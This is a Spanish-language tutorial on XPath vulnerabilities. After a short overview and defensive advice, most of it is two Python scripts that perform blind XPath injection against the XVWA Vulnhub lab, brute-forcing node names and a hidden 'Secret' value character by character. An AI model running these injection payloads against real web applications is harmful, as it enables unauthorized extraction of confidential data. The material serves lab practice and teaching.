**XPath** es un lenguaje de consultas utilizado en **XML** que permite buscar y recuperar información específica de **documentos XML**. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath también puede tener **vulnerabilidades** que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web.

Las **vulnerabilidades XPath** son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath:

-   **Inyección XPath**: los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento esperado de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas.
-   **Fuerza bruta de XPath**: los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPath y recuperar información confidencial. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial.
-   **Recuperación de información del servidor**: los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versión de la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataques más sofisticados.
-   **Manipulación de respuestas XPath**: los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso.

Para protegerse contra las vulnerabilidades de XPath, es importante validar todas las entradas de usuario y evitar la construcción dinámica de consultas XPath. Además, se recomienda restringir los permisos de acceso a los recursos de la aplicación web y mantener actualizado el software y los sistemas operativos. Por último, se recomienda utilizar herramientas de análisis de seguridad y realizar pruebas de penetración regulares para identificar y corregir cualquier vulnerabilidad en la aplicación web.

El enlace directo de descarga a la máquina XVWA 1 de Vulnhub,  para explotar las vulnerabilidades existentes en XPath:

-   **XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)

Script en python para aprovechar la vulnerabilidad de Xpath Injection del  laboratorio

```python
#!/usr/bin/python3
   2   │ from pwn import *
   3   │ 
   4   │ import requests
   5   │ import signal
   6   │ import time
   7   │ import sys
   8   │ import pdb
   9   │ import string
  10   │ 
  11   │ def def_hadler(sig, frame):
  12   │     print("\n\n[!] Saliendo...\n")
  13   │     sys.exit(1)
  14   │ 
  15   │ #Ctrl+c
  16   │ signal.signal(signal.SIGINT, def_hadler)
  17   │ 
  18   │ 
  19   │ #Variables globales
  20   │ main_url = "http://10.47.1.247/xvwa/vulnerabilities/xpath/" 
  21   │ characters = string.ascii_letters
  22   │ 
  23   │ def xPathInjection():
  24   │     
  25   │     data = ""
  26   │ 
  27   │     p1 = log.progress("Fuerza bruta")
  28   │     p1.status("Iniciando el ataque fuerza bruta..")
  29   │     time.sleep(2)
  30   │     
  31   │     p2 = log.progress("Data")
  32   │ 
  33   │     for first_position in range(1,6):
  34   │         for second_position in range (1,21):
  35   │             for character in characters:
  36   │ 
  37   │                 post_data = {
  38   │                     'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (first_position, second_position, character),
  39   │                     'submit': ''
  40   │                 }
  41   │ 
  42   │                 r = requests.post(main_url, data=post_data)
  43   │ 
  44   │                 if len(r.text) != 8691 and len(r.text) != 8692:
  45   │                     data += character
  46   │                     p2.status(data)
  47   │                     break
  48   │                  
  49   │          
  50   │         if first_position != 5: 
  51   │             data += ":"        
  52   │ 
  53   │          
  54   │ 
  55   │     p1.status("Ataque de fuerza bruta ha concluido")
  56   │     p2.success(data)
  57   │ 
  58   │ if __name__ == "__main__":
  59   │      xPathInjection()
  60   │ 
```

 Mostrar el mensaje oculto de la data
```python
#!/usr/bin/python3
   2   │ from pwn import *
   3   │ 
   4   │ import requests
   5   │ import signal
   6   │ import time
   7   │ import sys
   8   │ import pdb
   9   │ import string
  10   │ 
  11   │ def def_hadler(sig, frame):
  12   │     print("\n\n[!] Saliendo...\n")
  13   │     sys.exit(1)
  14   │ 
  15   │ #Ctrl+c
  16   │ signal.signal(signal.SIGINT, def_hadler)
  17   │ 
  18   │ 
  19   │ #Variables globales
  20   │ main_url = "http://10.47.1.247/xvwa/vulnerabilities/xpath/" 
  21   │ characters = string.ascii_letters + ' '
  22   │ 
  23   │ def xPathInjection():
  24   │     
  25   │     data = ""
  26   │ 
  27   │     p1 = log.progress("Fuerza bruta")
  28   │     p1.status("Iniciando el ataque fuerza bruta..")
  29   │     time.sleep(2)
  30   │     
  31   │     p2 = log.progress("Data")
  32   │ 
  33   │     for first_position in range(1,6):
  34   │         for character in characters:
  35   │ 
  36   │             post_data = {
  37   │                  'search': "1' and substring(Secret,%d,1)='%s" % (first_position, character),
  38   │                  'submit': ''
  39   │             }
  40   │ 
  41   │             r = requests.post(main_url, data=post_data)
  42   │ 
  43   │             if len(r.text) != 8676 and len(r.text) != 8677:
  44   │                 data += character
  45   │                 p2.status(data)
  46   │                 break  
  47   │ 
  48   │     p1.status("Ataque de fuerza bruta ha concluido")
  49   │     p2.success(data)
  50   │ 
  51   │ if __name__ == "__main__":
  52   │      xPathInjection()
```
